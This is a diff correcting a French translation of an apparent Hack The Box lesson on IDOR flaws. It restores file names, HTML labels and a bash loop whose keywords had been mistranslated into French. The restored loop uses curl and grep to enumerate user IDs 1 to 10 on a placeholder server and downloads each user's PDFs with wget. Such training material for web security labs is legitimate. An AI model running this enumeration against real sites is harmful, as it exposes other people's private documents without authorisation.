@@ -45,8 +45,8 @@ Cependant, `nous devons être attentifs aux détails de la page lors de tout pe
 Code : html
 
 ```
-/documents/Facture_2_08_2020.pdf
-/documents/Rapport_2_12_2020.pdf
+/documents/Invoice_2_08_2020.pdf
+/documents/Report_2_12_2020.pdf
 
 ```
 
@@ -64,8 +64,8 @@ Nous pouvons cliquer sur [`CTRL+SHIFT+C`] dans Firefox pour activer `l'inspecte
 Code : html
 
 ```
-<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Facture</a></li>
-<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Rapport</a></li>
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
 
 ```
 
@@ -74,8 +74,8 @@ Nous pouvons choisir n'importe quel mot unique pour pouvoir `grep` le lien du 
 ```
 dsgsec@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
 
-<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Facture</a></li>
-<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Rapport</a></li>
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
 
 ```
 
@@ -98,11 +98,11 @@ Code : bash
 
 url="http://SERVER_IP:PORT"
 
-pour je dans {1..10} ; faire
-         pour le lien dans $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); faire
-                 wget -q $url/$lien
-         fait
-fait
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
 
 ```
 
